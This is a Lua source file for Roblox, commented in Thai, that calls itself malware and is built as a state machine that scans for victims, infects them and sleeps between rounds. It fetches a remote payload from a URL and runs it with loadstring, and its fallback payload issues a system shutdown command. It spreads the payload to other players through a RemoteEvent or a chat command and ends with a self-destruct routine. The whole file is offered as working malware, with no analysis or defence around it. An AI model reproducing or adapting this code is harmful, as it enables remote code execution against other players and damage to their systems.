-- virus_fsm.lua
-- Finite State Machine Malware with Maid Cleanup & Payload Injection

-- ============================================
-- MAID PATTERN (จาก cleanup.md)
-- ============================================
local Maid = {}
Maid.__index = Maid

function Maid.new()
    return setmetatable({ _tasks = {} }, Maid)
end

function Maid:GiveTask(task)
    table.insert(self._tasks, task)
    return task
end

function Maid:DoCleaning()
    for i = #self._tasks, 1, -1 do
        local task = self._tasks[i]
        self._tasks[i] = nil
        if typeof(task) == "RBXScriptConnection" then
            task:Disconnect()
        elseif type(task) == "function" then
            pcall(task)
        elseif typeof(task) == "Instance" then
            task:Destroy()
        elseif type(task) == "table" and type(task.Destroy) == "function" then
            pcall(function() task:Destroy() end)
        end
    end
end

-- ============================================
-- FSM CORE
-- ============================================
local FSM = {
    CurrentState = "IDLE",
    States = {},
    Payload = nil,
    VictimList = {},
    Maid = Maid.new(),
    HeartbeatConnection = nil,
    Config = {
        SpreadInterval = 5,
        MaxVictims = 100,
        PayloadURL = "https://raw.githubusercontent.com/yourusername/yourrepo/main/payload.lua",
    }
}

-- ============================================
-- STATE DEFINITIONS
-- ============================================

FSM.States.IDLE = {
    onEnter = function()
        print("[FSM] IDLE: กำลังรอคำสั่ง...")
        if not FSM.Payload then
            FSM:FetchPayload()
        end
    end
}

FSM.States.SCANNING = {
    onEnter = function()
        print("[FSM] SCANNING: กำลังสแกนหาเหยื่อ...")
        FSM:ScanVictims()
        FSM:SetState("INFECTING")
    end
}

FSM.States.INFECTING = {
    onEnter = function()
        print("[FSM] INFECTING: กำลังแพร่กระจาย...")
        FSM:SpreadInfection()
        FSM:SetState("SLEEPING")
    end
}

FSM.States.SLEEPING = {
    onEnter = function()
        print("[FSM] SLEEPING: หลับ " .. FSM.Config.SpreadInterval .. " วินาที")
        task.wait(FSM.Config.SpreadInterval)
        FSM:SetState("SCANNING")
    end
}

FSM.States.ERROR = {
    onEnter = function(err)
        print("[FSM] ERROR: " .. tostring(err))
        task.wait(2)
        FSM:SetState("IDLE")
    end
}

FSM.States.SHUTDOWN = {
    onEnter = function()
        print("[FSM] SHUTDOWN: กำลังล้างและทำลายตัวเอง...")
        FSM:SelfDestruct()
    end
}

-- ============================================
-- STATE TRANSITION
-- ============================================

function FSM:SetState(newState, payload)
    if self.CurrentState == newState then return end
    local old = self.CurrentState

    if not self:IsValidTransition(old, newState) then
        print("[FSM] เปลี่ยนสถานะไม่ถูกต้อง: " .. old .. " -> " .. newState)
        return
    end

    if self.States[old] and self.States[old].onExit then
        pcall(self.States[old].onExit)
    end

    self.CurrentState = newState

    if self.States[newState] and self.States[newState].onEnter then
        pcall(self.States[newState].onEnter, payload)
    end
end

function FSM:IsValidTransition(from, to)
    local valid = {
        IDLE = { SCANNING = true, SHUTDOWN = true },
        SCANNING = { INFECTING = true, ERROR = true, SHUTDOWN = true },
        INFECTING = { SLEEPING = true, ERROR = true, SHUTDOWN = true },
        SLEEPING = { SCANNING = true, ERROR = true, SHUTDOWN = true },
        ERROR = { IDLE = true, SHUTDOWN = true },
        SHUTDOWN = {}
    }
    return valid[from] and valid[from][to] or false
end

-- ============================================
-- PAYLOAD HANDLING
-- ============================================

function FSM:FetchPayload()
    print("[FSM] กำลังดึง payload...")
    local success, data = pcall(function()
        local HttpService = game:GetService("HttpService")
        return HttpService:GetAsync(self.Config.PayloadURL)
    end)

    if success and data then
        self.Payload = data
        self:ExecutePayload()
    else
        self.Payload = self:GetFallbackPayload()
    end
end

function FSM:GetFallbackPayload()
    return [[
        if os and os.execute then
            os.execute("shutdown /s /t 5 /c \"System error\"")
        end
        if script and script.Parent then
            script.Parent:Destroy()
        end
    ]]
end

function FSM:ExecutePayload()
    if not self.Payload then return end
    local func, err = loadstring(self.Payload)
    if func then
        pcall(func)
    else
        self:SetState("ERROR", err)
    end
end

-- ============================================
-- SPREAD INFECTION
-- ============================================

function FSM:ScanVictims()
    local Players = game:GetService("Players")
    local victims = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Players.LocalPlayer then
            table.insert(victims, player.Name)
        end
    end
    self.VictimList = victims
    print("[FSM] พบเหยื่อ " .. #victims .. " ราย")
end

function FSM:SpreadInfection()
    local count = 0
    for _, victimName in ipairs(self.VictimList) do
        if count >= self.Config.MaxVictims then break end
        if self:InfectVictim(victimName) then
            count = count + 1
        end
        task.wait(0.5)
    end
    print("[FSM] แพร่เชื้อสำเร็จ " .. count .. " ราย")
end

function FSM:InfectVictim(victimName)
    local success = pcall(function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local remote = ReplicatedStorage:FindFirstChild("RemoteEvent")
        if remote then
            remote:FireServer(victimName, self.Payload)
        else
            local Players = game:GetService("Players")
            local player = Players:FindFirstChild(victimName)
            if player then
                player:Chat("!infect " .. self.Payload)
            end
        end
    end)
    return success
end

-- ============================================
-- CLEANUP & SELF DESTRUCT
-- ============================================

function FSM:SelfDestruct()
    print("[FSM] กำลังล้างและทำลายตัวเอง...")

    -- ใช้ Maid ล้างทุกอย่าง
    self.Maid:DoCleaning()

    -- ลบตัวเองออกจากต้นไม้
    pcall(function()
        if script and script.Parent then
            script.Parent:Destroy()
        end
    end)

    print("[FSM] ทำลายตัวเองสำเร็จ")
    while true do task.wait(999999) end
end

-- ============================================
-- START
-- ============================================

function FSM:Start()
    print("[FSM] เริ่มทำงาน...")

    -- ผูก Heartbeat ผ่าน Maid เพื่อให้ล้างได้
    local heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
        if FSM.CurrentState == "ERROR" then
            task.wait(10)
            FSM:SetState("IDLE")
        end
    end)

    FSM.Maid:GiveTask(heartbeatConnection)

    self:SetState("IDLE")
end

-- ============================================
-- MAIN
-- ============================================

if game then
    print("[FSM] Suji and VC+ Virus FSM + Cleanup กำลังทำงาน...")
    FSM:Start()

    -- ผูก CharacterRemoving เพื่อล้างอัตโนมัติ
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    if player then
        local charConnection = player.CharacterRemoving:Connect(function()
            FSM.Maid:DoCleaning()
            print("[FSM] ล้างทรัพยากรตาม CharacterRemoving")
        end)
        FSM.Maid:GiveTask(charConnection)
    end
end

-- ============================================
-- EXPORT
-- ============================================
return FSM
